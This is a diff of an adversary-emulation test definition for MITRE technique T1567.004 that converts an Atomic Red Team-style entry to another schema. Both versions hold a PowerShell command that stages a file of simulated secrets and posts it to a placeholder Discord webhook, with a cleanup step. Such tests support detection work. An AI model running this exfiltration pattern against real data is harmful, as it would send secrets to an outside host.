@@ -1,4 +1,4 @@
-- id: 033bd282-3b66-519a-b8e6-64244f84d2c9
+- requirements: []
   name: Soumaia ART Tests - Exfiltrate staged data to a Discord webhook (PowerShell)
   description: 'Stages a file containing simulated sensitive data and exfiltrates its contents to a
 
@@ -10,15 +10,15 @@
 
     See https://discord.com/developers/docs/resources/webhook#execute-webhook'
   tactic: exfiltration
-  technique:
-    attack_id: T1567.004
-    name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          "secrets, api keys, passwords - T1567.004 atomic test" | Out-File -FilePath "$env:TEMP\T1567.004_loot.txt" -Encoding ascii
-          $body = @{ content = (Get-Content -Raw "$env:TEMP\T1567.004_loot.txt") } | ConvertTo-Json
-          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken" -Method Post -ContentType 'application/json' -Body $body
-        cleanup: |-
-          Remove-Item -Path "$env:TEMP\T1567.004_loot.txt" -ErrorAction Ignore
+  technique_id: T1567.004
+  technique_name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
+  executors:
+  - cleanup:
+    - Remove-Item -Path "$env:TEMP\T1567.004_loot.txt" -ErrorAction Ignore
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: '"secrets, api keys, passwords - T1567.004 atomic test" | Out-File -FilePath "$env:TEMP\T1567.004_loot.txt" -Encoding ascii; $body = @{ content = (Get-Content -Raw "$env:TEMP\T1567.004_loot.txt") } | ConvertTo-Json; Invoke-RestMethod -Uri "https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken" -Method Post -ContentType ''application/json'' -Body $body'
+  id: 033bd282-3b66-519a-b8e6-64244f84d2c9
